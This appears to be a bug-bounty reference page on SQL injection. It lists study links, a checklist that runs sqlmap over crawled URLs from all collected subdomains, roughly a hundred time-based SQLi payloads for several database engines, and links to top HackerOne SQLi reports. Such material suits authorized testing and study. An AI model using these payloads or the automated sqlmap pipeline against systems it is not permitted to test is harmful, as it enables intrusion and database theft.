---
description: >-
  CWE-89: Improper Neutralization of Special Elements used in an SQL Command
  ('SQL Injection')
---

# SQL Injection

> **How to start**

1. Study SQL
2. [http://www.amazon.com/SQL-Injection-Attacks-Defense-Second/dp/1597499633/](http://www.amazon.com/SQL-Injection-Attacks-Defense-Second/dp/1597499633/)
3. [https://portswigger.net/web-security/all-labs](https://portswigger.net/web-security/all-labs)
4. [https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
5. [https://github.com/Audi-1/sqli-labs](https://github.com/Audi-1/sqli-labs)
6. [https://rails-sqli.org/](https://rails-sqli.org/)
7. [https://www.youtube.com/watch?v=VIkVqvo97Hk](https://www.youtube.com/watch?v=VIkVqvo97Hk)
8. [https://www.youtube.com/watch?v=SEuyruffJTw](https://www.youtube.com/watch?v=SEuyruffJTw)

> **Methodology**

* [ ] Burp Suite via Active Scan and Agartha extension
* [ ] Collect all Subdomain -> Crawl -> `gf sqli urls >> sqli` -> `sqlmap -m sqli --dbs --batch`
* [ ] Dork for extensions like `.php` or paths that most like to be vulnerable to SQLI -> `Arjun` -> `sqlmap`

> **Time Based SQLi Payloads**

```python
sleep(5)#
14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515
'XOR(if(now()=sysdate(),sleep(33),0))OR'
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
pg_sleep(5)--
1 or pg_sleep(5)--
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
waitfor delay '00:00:05'
waitfor delay '00:00:05'--
waitfor delay '00:00:05'#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)--
pg_SLEEP(5)#
or pg_SLEEP(5)
or pg_SLEEP(5)--
or pg_SLEEP(5)#
'\"
AnD SLEEP(5)
AnD SLEEP(5)--
AnD SLEEP(5)#
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+benchmark(3200,SHA1(1))+'
+ SLEEP(10) + '
RANDOMBLOB(500000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## Top SQLI reports from HackerOne:

1. [SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database](https://hackerone.com/reports/531051) to Starbucks - 743 upvotes, $0
2. [SQL injection in https://labs.data.gov/dashboard/datagov/csv\_to\_json via User-agent ](https://hackerone.com/reports/297478)to GSA Bounty - 671 upvotes, $0
3. [Time-Based SQL injection at city-mobil.ru](https://hackerone.com/reports/868436) to Mail.ru - 625 upvotes, $15000
4. [SQL injection at https://sea-web.gold.razer.com/ajax-get-status.php via txid parameter](https://hackerone.com/reports/819738) to Razer - 580 upvotes, $2000
5. [SQL Injection in https://api-my.pay.razer.com/inviteFriend/getInviteHistoryLog](https://hackerone.com/reports/811111) to Razer - 528 upvotes, $2000
6. [SQL injection on contactws.contact-sys.com in TScenObject action ScenObjects leads to remote code execution](https://hackerone.com/reports/816254) to QIWI - 469 upvotes, $0
7. [Blind SQL Injection ](https://hackerone.com/reports/758654)to InnoGames - 432 upvotes, $2000
8. [SQL injection at fleet.city-mobil.ru](https://hackerone.com/reports/881901) to Mail.ru - 370 upvotes, $10000
9. [SQL Injection in report\_xml.php through countryFilter\[\] parameter](https://hackerone.com/reports/383127) to Valve - 348 upvotes, $25000
10. [\[windows10.hi-tech.mail.ru\] Blind SQL Injection ](https://hackerone.com/reports/786044)to Mail.ru - 329 upvotes, $5000
11. [SQL Injection on cookie parameter](https://hackerone.com/reports/761304) to MTN Group - 303 upvotes, $0
12. [\[www.zomato.com\] SQLi - /php/██████████ - item\_id](https://hackerone.com/reports/403616) to Zomato - 289 upvotes, $4500
13. [SQL Injection at https://sea-web.gold.razer.com/lab/cash-card-incomplete-translog-resend via period-hour Parameter](https://hackerone.com/reports/781205) to Razer - 240 upvotes, $2000
14. [\[api.easy2pay.co\] SQL Injection at fortumo via TransID parameter \[Bypassing Signature Validation🔥\]](https://hackerone.com/reports/894325) to Razer - 232 upvotes, $4000
15. [Boolean-based SQL Injection on relap.io](https://hackerone.com/reports/745938) to Mail.ru - 227 upvotes, $0
16. [Blind SQL Injection in city-mobil.ru domain](https://hackerone.com/reports/711075) to Mail.ru - 224 upvotes, $2000
17. [SQL Injection in agent-manager](https://hackerone.com/reports/962889) to Acronis - 223 upvotes, $0
18. [Blind SQLi leading to RCE, from Unauthenticated access to a test API Webservice](https://hackerone.com/reports/592400) to Starbucks - 218 upvotes, $0
19. [SQL Injection in www.hyperpure.com](https://hackerone.com/reports/1044716) to Zomato - 211 upvotes, $2000
20. [Blind SQL injection and making any profile comments from any users to disappear using "like" function (2 in 1 issues)](https://hackerone.com/reports/363815) to Pornhub - 210 upvotes, $0
21. [Blind SQL Injection on starbucks.com.gt and WAF Bypass :\*](https://hackerone.com/reports/549355) to Starbucks - 202 upvotes, $0
22. [Remote Code Execution on contactws.contact-sys.com via SQL injection in TCertObject operation "Delete"](https://hackerone.com/reports/816086) to QIWI - 194 upvotes, $0
23. [SQLi at https://sea-web.gold.razer.com/demo-th/purchase-result.php via orderid Parameter](https://hackerone.com/reports/777693) to Razer - 183 upvotes, $2000
24. [Blind SQL injection in Hall of Fap](https://hackerone.com/reports/295841) to Pornhub - 179 upvotes, $0
25. [www.drivegrab.com SQL injection](https://hackerone.com/reports/273946) to Grab - 175 upvotes, $4500
26. [Sql injection on docs.atavist.com](https://hackerone.com/reports/1039315) to Automattic - 158 upvotes, $0
27. [SQL Injection \[unauthenticated\] with direct output at https://news.mail.ru/](https://hackerone.com/reports/818972) to Mail.ru - 155 upvotes, $7500
28. [bypass sql injection #1109311](https://hackerone.com/reports/1224660) to Acronis - 150 upvotes, $0
29. [SQL injection in GraphQL endpoint through embedded\_submission\_form\_uuid parameter](https://hackerone.com/reports/435066) to HackerOne - 147 upvotes, $0
30. [SQL Injection Union Based](https://hackerone.com/reports/1046084) to Automattic - 123 upvotes, $0
